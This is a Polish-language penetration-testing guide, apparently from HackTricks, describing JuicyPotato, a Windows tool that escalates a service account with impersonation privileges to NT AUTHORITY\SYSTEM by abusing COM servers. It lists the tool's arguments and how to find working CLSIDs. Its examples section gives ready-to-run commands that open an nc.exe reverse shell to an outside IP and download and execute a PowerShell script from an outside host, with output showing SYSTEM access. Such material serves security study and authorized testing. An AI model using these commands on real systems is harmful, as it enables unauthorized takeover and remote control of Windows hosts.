# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** na Windows Server 2019 i Windows 10 w wersji 1809 i nowszych. Jednakże, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) mogą być użyte do **uzyskania tych samych uprawnień i zdobycia dostępu na poziomie `NT AUTHORITY\SYSTEM`**. _**Sprawdź:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (wykorzystanie złotych uprawnień) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Słodzona wersja_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, z odrobiną soku, tzn. **kolejne narzędzie do eskalacji uprawnień lokalnych, z konta usługi Windows do NT AUTHORITY\SYSTEM**_

#### Możesz pobrać juicypotato z [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Podsumowanie <a href="#summary" id="summary"></a>

[**Z readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [usłudze](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) mającej nasłuch MiTM na `127.0.0.1:6666` i gdy masz uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu wersji Windows znaleźliśmy konfigurację, w której `BITS` był celowo wyłączony, a port `6666` był zajęty.

Postanowiliśmy uzbroić [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Powitaj Juicy Potato**.

> Aby poznać teorię, zobacz [Rotten Potato - Eskalacja uprawnień z kont usług do SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i śledź łańcuch linków i odniesień.

Odkryliśmy, że oprócz `BITS` istnieje kilka serwerów COM, które możemy wykorzystać. Muszą one tylko:

1. być instancjonowane przez bieżącego użytkownika, zazwyczaj „użytkownika usługi”, który ma uprawnienia do impersonacji
2. implementować interfejs `IMarshal`
3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, …)

Po kilku testach uzyskaliśmy i przetestowaliśmy obszerną listę [interesujących CLSID-ów](http://ohpe.it/juicy-potato/CLSID/) na kilku wersjach Windows.

### Soczyste szczegóły <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato pozwala Ci:

- **Cel CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _możesz znaleźć listę uporządkowaną według systemu operacyjnego._
- **Port nasłuchujący COM** _zdefiniuj preferowany port nasłuchujący COM (zamiast twardo zakodowanego 6666)_
- **Adres IP nasłuchujący COM** _przypisz serwer do dowolnego adresu IP_
- **Tryb tworzenia procesu** _w zależności od uprawnień użytkownika impersonowanego możesz wybierać spośród:_
- `CreateProcessWithToken` (wymaga `SeImpersonate`)
- `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
- `oba`
- **Proces do uruchomienia** _uruchom plik wykonywalny lub skrypt, jeśli eksploatacja się powiedzie_
- **Argument procesu** _dostosuj argumenty uruchamianego procesu_
- **Adres serwera RPC** _dla dyskretnego podejścia możesz uwierzytelnić się w zewnętrznym serwerze RPC_
- **Port serwera RPC** _przydatne, jeśli chcesz uwierzytelnić się w zewnętrznym serwerze, a zapora blokuje port `135`…_
- **TRYB TESTOWY** _głównie do celów testowych, tzn. testowanie CLSID-ów. Tworzy DCOM i drukuje użytkownika tokena. Zobacz_ [_tutaj do testowania_](http://ohpe.it/juicy-potato/Test/)

### Użycie <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Ostateczne myśli <a href="#final-thoughts" id="final-thoughts"></a>

[**Z Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.

Prawie niemożliwe jest zapobieżenie nadużywaniu wszystkich tych serwerów COM. Możesz pomyśleć o modyfikacji uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia, to będzie wyzwanie.

Rzeczywistym rozwiązaniem jest ochrona wrażliwych kont i aplikacji, które działają pod kontami `* SERVICE`. Zatrzymanie `DCOM` z pewnością uniemożliwiłoby to wykorzystanie, ale mogłoby mieć poważny wpływ na podstawowy system operacyjny.

Z: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Przykłady

Uwaga: Odwiedź [tę stronę](https://ohpe.it/juicy-potato/CLSID/), aby zobaczyć listę CLSID-ów do wypróbowania.

### Uzyskaj powłokę odwrotną nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowy CMD (jeśli masz dostęp RDP)

![](<../../images/image (300).png>)

## Problemy z CLSID

Często domyślny CLSID, który używa JuicyPotato, **nie działa** i exploit się nie powodzi. Zwykle potrzeba wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do przetestowania dla konkretnego systemu operacyjnego, powinieneś odwiedzić tę stronę:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Sprawdzanie CLSID**

Najpierw będziesz potrzebować kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do przetestowania.

Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i uruchom go. Zacznie próbować każdy CLSID, a **gdy numer portu się zmieni, oznacza to, że CLSID zadziałał**.

**Sprawdź** działające CLSID **używając parametru -c**

## Odniesienia

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
